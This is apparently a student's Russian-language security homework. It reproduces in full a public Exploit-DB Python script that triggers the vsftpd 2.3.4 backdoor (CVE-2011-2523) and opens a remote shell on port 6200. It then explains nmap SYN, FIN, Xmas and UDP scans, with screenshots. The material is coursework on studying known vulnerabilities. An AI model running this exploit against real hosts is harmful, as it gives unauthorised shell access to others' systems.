# git_15
Задание 1

![image](https://github.com/user-attachments/assets/53fdcb86-9e64-485a-988a-3372f0394c80)

В Exploit DB нашёл только одну сетевую службу vsftpd 2.3.4
# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
# Date: 9-04-2021
# Exploit Author: HerculesRD
# Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html
# Version: vsftpd 2.3.4
# Tested on: debian
# CVE : CVE-2011-2523

#!/usr/bin/python3   
                                                           
from telnetlib import Telnet 
import argparse
from signal import signal, SIGINT
from sys import exit

def handler(signal_received, frame):
    # Handle any cleanup here
    print('   [+]Exiting...')
    exit(0)

signal(SIGINT, handler)                           
parser=argparse.ArgumentParser()        
parser.add_argument("host", help="input the address of the vulnerable host", type=str)
args = parser.parse_args()       
host = args.host                        
portFTP = 21 #if necessary edit this line

user="USER nergal:)"
password="PASS pass"

tn=Telnet(host, portFTP)
tn.read_until(b"(vsFTPd 2.3.4)") #if necessary, edit this line
tn.write(user.encode('ascii') + b"\n")
tn.read_until(b"password.") #if necessary, edit this line
tn.write(password.encode('ascii') + b"\n")

tn2=Telnet(host, 6200)
print('Success, shell opened')
print('Send `exit` to quit shell')
tn2.interact()

Задание 2

![image](https://github.com/user-attachments/assets/6389a3da-a62b-49f2-99ad-cf0d16c1cc43)

![image](https://github.com/user-attachments/assets/d26d8317-fbe6-4766-bd31-fd8bf3c608dd)

![image](https://github.com/user-attachments/assets/ef6c3cee-59d2-4316-bfbd-7d680162ce1e)

![image](https://github.com/user-attachments/assets/a5b9937e-097d-4f59-84c5-d1797ce6f1d0)


SYN сканирование:
- При SYN сканировании отправляется только пакет с флагом SYN, чтобы установить соединение с портом.
- Если порт открыт, целевой хост отправляет пакет с флагами SYN-ACK в ответ.
- SYN сканирование создает минимальный сетевой трафик, так как не завершает установление соединения.

FIN сканирование:
- При FIN сканировании отправляется пакет с флагом FIN, чтобы закрыть соединение с портом.
- Если порт закрыт, целевой хост должен отправить пакет с флагом RST в ответ.
- FIN сканирование создает небольшой сетевой трафик, но может быть менее надежным из-за различий в реакции хоста на закрытие соединения.

Xmas сканирование:
- При Xmas сканировании отправляются пакеты с установленными флагами FIN, URG и PUSH.
- Если порт закрыт, целевой хост должен отправить пакет с флагом RST в ответ.
- Xmas сканирование создает необычный сетевой трафик, что может помочь обойти некоторые средства обнаружения сканирования.

UDP сканирование:
- При UDP сканировании отправляются пакеты UDP на порты для определения их состояния.
- Если порт закрыт, целевой хост должен отправить пакет ICMP с сообщением о недоступности порта.
- UDP сканирование может создавать больше сетевого трафика из-за необходимости обработки ICMP сообщений.		

		
